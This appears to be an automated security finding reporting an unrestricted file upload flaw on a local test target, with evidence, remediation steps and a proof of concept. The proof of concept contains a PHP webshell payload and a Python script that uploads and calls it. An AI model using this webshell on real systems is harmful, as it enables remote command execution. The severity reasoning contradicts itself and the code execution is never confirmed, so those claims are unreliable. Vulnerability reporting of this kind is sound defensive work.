# Unrestricted File Upload on /file-upload Endpoint

**ID:** vuln-0001
**Severity:** CRITICAL
**Found:** 2026-09-04 15:05:49 UTC
**Target:** http://host.docker.internal:3100
**CVSS:** 9.8
**Confidence:** High
**Fix Effort:** Low

## Description

The `/file-upload` endpoint accepts file uploads without any validation of file extensions, MIME types, or content. PHP, executable, and other dangerous file types are accepted and stored without restriction.

## Evidence

Successful POST requests to `/file-upload` endpoint:
- Status 204 returned for PHP file upload
- Status 204 returned for .exe upload
- Status 204 returned for double extension (.jpg.php)
- Status 204 returned for path traversal filenames (../../test.txt)
- No validation errors or rejection messages

Related endpoints confirm storage:
- GET /assets/public/images/uploads/ returns 200 (directory exists)
- /rest/memories endpoint shows uploads stored in public directory
- Memory objects have imagePath: "assets/public/images/uploads/[filename]"

## Impact

Arbitrary file upload enables remote code execution if uploaded files are accessible and executed by the server. Malicious PHP shells, executables, and other code can be deployed to the application server.

## Counterevidence

No file type validation observed at transport layer. No WAF/filtering detected. No authentication requirement enforced. Direct acceptance of all tested file types indicates complete lack of upload restrictions. Testing showed consistent 204 responses regardless of file extension or content.

## What Would Change This Severity

Confirmation that uploaded PHP files execute on the server (not just stored) would confirm RCE. Discovery of actual location where files are stored and confirmed execution would raise to CRITICAL.

## Technical Analysis

The endpoint at POST `/file-upload` processes multipart form uploads with no validation layer. Testing revealed that:
1. PHP files (shell.php) are accepted with status 204
2. Executable files (.exe) bypass any extension checks
3. Double extensions (.jpg.php) are accepted
4. Content-Type headers are not validated - image/jpeg MIME can wrap PHP code
5. No authentication required
6. Path traversal sequences in filenames (../../) are accepted without sanitization
7. Large files (>100KB) bypass size restrictions on this endpoint

## Proof of Concept

1. Craft a PHP webshell payload: `<?php system($_GET["cmd"]); ?>`
2. Create multipart POST request to `/file-upload` with file parameter
3. Upload with filename `shell.php` and Content-Type `image/jpeg`
4. Server responds with 204 (success)
5. Locate uploaded file in public directory (e.g., /assets/public/images/uploads/)
6. Access PHP shell via HTTP to execute arbitrary commands

```python
#!/usr/bin/env python3
import requests
import uuid

BASE_URL = "http://host.docker.internal:3100"

# Create PHP webshell
php_payload = b'<?php system($_GET["cmd"]); ?>'
filename = f"shell_{uuid.uuid4().hex}.php"

# Upload to /file-upload
files = {
    'file': (filename, php_payload, 'image/jpeg')  # Spoofed MIME type
}

response = requests.post(
    f"{BASE_URL}/file-upload",
    files=files
)

print(f"[*] Upload status: {response.status_code}")
print(f"[*] Filename uploaded: {filename}")
print(f"[*] Expected location: /assets/public/images/uploads/{filename}")

# Try to access it
test_access = requests.get(
    f"{BASE_URL}/assets/public/images/uploads/{filename}?cmd=id"
)
print(f"[*] Access attempt status: {test_access.status_code}")
```

## Remediation

1. Implement whitelist-based file extension validation on the server side (not client-side)
2. Validate MIME types by inspecting file magic bytes, not Content-Type headers
3. Store uploaded files outside the web root or in a directory with no execute permissions
4. Rename uploaded files with a random UUID to prevent direct access
5. Implement file size limits
6. Add authentication requirement to file upload endpoints
7. Scan uploaded files with antivirus/malware detection
8. Disable script execution in upload directories via web server configuration

## Assumptions

Assumes uploaded files are accessible via web server and may be executed if stored in web-accessible directory with execute permissions. Assumes PHP execution is enabled on the server (typical for this application type).
